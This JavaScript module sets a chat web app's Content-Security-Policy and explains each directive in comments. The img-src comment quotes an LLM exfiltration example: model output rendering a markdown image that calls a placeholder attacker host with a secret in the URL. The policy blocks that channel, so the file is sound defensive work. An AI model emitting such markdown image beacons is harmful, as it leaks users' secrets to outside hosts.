/**
 * The IAM origin THIS deployment federates to.
 *
 * Read from `OPENID_ISSUER` — the same variable the backend's passport strategy
 * registers with and `iamConfig.js` hands the browser as `window.__HANZO_IAM__`
 * — so the policy cannot name a different issuer than the login it is there to
 * permit. Written out as the literal `https://hanzo.id`, it was Hanzo's origin
 * in an image two brands share: on lux.chat the SPA signed in at lux.id, came
 * back to `/auth/callback` with a code, and the token POST died on this policy.
 * Login was impossible there for EVERY account, new or existing, while the
 * server stayed healthy and the issuer did nothing wrong.
 *
 * One origin, not a list of every brand's: naming hanzo.id here on lux.chat
 * would grant a connection Lux's product has no reason to make.
 *
 * `.origin` normalises a trailing slash or path away, since a CSP source is an
 * origin; an unparseable value falls back rather than emitting a broken policy.
 */
const IAM_ORIGIN = (() => {
  try {
    return new URL(process.env.OPENID_ISSUER || 'https://hanzo.id').origin;
  } catch {
    return 'https://hanzo.id';
  }
})();

/**
 * The one Content-Security-Policy served with every response.
 *
 * `connect-src` must include the IAM origin: login is browser PKCE, so the SPA
 * itself fetches `/.well-known/openid-configuration` and POSTs the code to
 * `/v1/iam/oauth/token`. Without it a visitor signs in, returns to
 * `/auth/callback`, and the exchange dies on CSP ("IAM session bridge failed:
 * Failed to fetch") — login silently never completes. hanzo.id is NOT covered
 * by `*.hanzo.ai`.
 *
 * `frame-src` stays at `'self'`. It once also listed hanzo.id, for `signinSilent()`
 * — a `prompt=none` authorize in a HIDDEN IFRAME. That flow is gone: hanzo.id
 * answers `frame-ancestors 'none'` + `X-Frame-Options: DENY` on every route
 * including `/login/oauth/authorize`, so the IdP refuses to be framed by anyone
 * and no relying-party CSP can change that. Chat now signs in by interactive
 * redirect only, and renews the forwarded bearer server-side
 * (services/iamBearerRefresh.js `currentBearer`) — which is what actually keeps a
 * signed-in session answering. Do not re-add the origin without a flow that uses it.
 *
 * `frame-ancestors 'self'` (with `X-Frame-Options: SAMEORIGIN`) refuses framing by
 * any other origin; same-origin is needed for the silent.mp3 audio unlock iframe.
 * Nothing may embed US. What WE embed is enumerated in `frame-src` below.
 */
const contentSecurityPolicy = [
  "default-src 'self'",
  // No analytics.hanzo.ai: the last page tag that loaded a script from it is gone.
  // Telemetry is the @hanzo/event client, which only ever POSTs (connect-src).
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://hanzo.app https://static.cloudflareinsights.com",
  "style-src 'self' 'unsafe-inline'",
  // NOT `https:`. A bare-scheme image source is the classic LLM exfiltration
  // channel: model output `![](https://attacker/p?d=<secret>)` auto-fires a
  // GET the instant it renders. The app's own images are same-origin (served
  // from /v1/chat/images) or come from our file store; nothing legitimate
  // needs an arbitrary host. The markdown image RENDERER also refuses to
  // auto-load a third-party src (MarkdownComponents.tsx `autoLoadable`) — this
  // is the backstop under it, so a future renderer that forgets still cannot
  // beacon.
  // The file store answers on a PER-BUCKET host — an uploaded image comes back
  // from `chat-files.s3-api.hanzo.ai`, not from the bare API host — so naming
  // only the apex silently blocked every image a user had uploaded. The wildcard
  // covers the bucket subdomains and nothing else: it is one registrable domain
  // we own, not a bare scheme, so the exfiltration channel described above stays
  // shut.
  // The issuer serves the account's profile photo (the `picture` claim the IAM
  // login stores as the user's avatar); the account menu renders it as a plain
  // <img>. Safe to allow: it is our own IdP (one registrable domain we own,
  // not a scheme), and the markdown image renderer still auto-loads ONLY
  // same-origin, so this cannot become a beacon in message content.
  `img-src 'self' data: blob: ${IAM_ORIGIN} https://s3.hanzo.ai https://s3-api.hanzo.ai https://*.s3-api.hanzo.ai`,
  "font-src 'self' data:",
  "media-src 'self' data: blob:",
  `connect-src 'self' ${IAM_ORIGIN} https://hanzo.app https://*.hanzo.ai https://*.hanzo.chat wss://*.hanzo.chat https://static.cloudflareinsights.com https://cloudflareinsights.com`,
  // 'self' keeps the same-origin silent.mp3 audio-unlock iframe.
  //
  // www.youtube.com and player.twitch.tv are the only players the backdrop can
  // embed (components/Chat/Backdrop.tsx) — youtube, not nocookie, because that
  // host answers embeds with a configuration error. This list is what makes
  // "Netflix cannot play here" true in the browser and not merely in the UI
  // copy: an origin not named here cannot be framed whatever anyone configures.
  //
  // world.hanzo.ai is the dock's widget card (components/Chat/Dock). Every
  // origin here is enumerated on purpose rather than widened to *.hanzo.ai:
  // frame-src decides what may be rendered INSIDE this page, so a wildcard
  // would let any future subdomain — including one nobody reviewed — frame
  // itself over the conversation. A card whose origin is missing renders an
  // EMPTY frame and logs nothing useful, so cards.spec.ts asserts every card's
  // origin appears here.
  //
  // THE TRADEOFF THIS LINE OWNS, stated so it can be decided rather than drifted
  // into: the bottom bar's Browser tab frames a URL the READER types, and this
  // list refuses every origin but the three above. So the feature, as policy
  // stands, can browse essentially nothing — a reader who types example.com is
  // refused. That is a security decision, not a UI one, and it is deliberately
  // NOT taken here: widening `frame-src` to `https:` would let any origin be
  // framed over the conversation, and a widened list cannot be un-widened once
  // cards and readers depend on it. What was fixed instead is the SILENCE — the
  // refusal now renders an explicit state naming the origin, with a link that
  // opens it in a new tab (`SidePanel/Preview/Panel.tsx`, which listens for the
  // `securitypolicyviolation` this directive fires). Deciding to widen means
  // deciding what a framed third-party page may do next to a conversation:
  // clickjacking over the composer, and every reader's typed URL becoming a
  // load this origin performs. Take that decision explicitly, or leave the tab
  // honest about its limits.
  "frame-src 'self' https://www.youtube.com https://player.twitch.tv https://world.hanzo.ai",
  "frame-ancestors 'self'",
].join('; ');

module.exports = { contentSecurityPolicy };
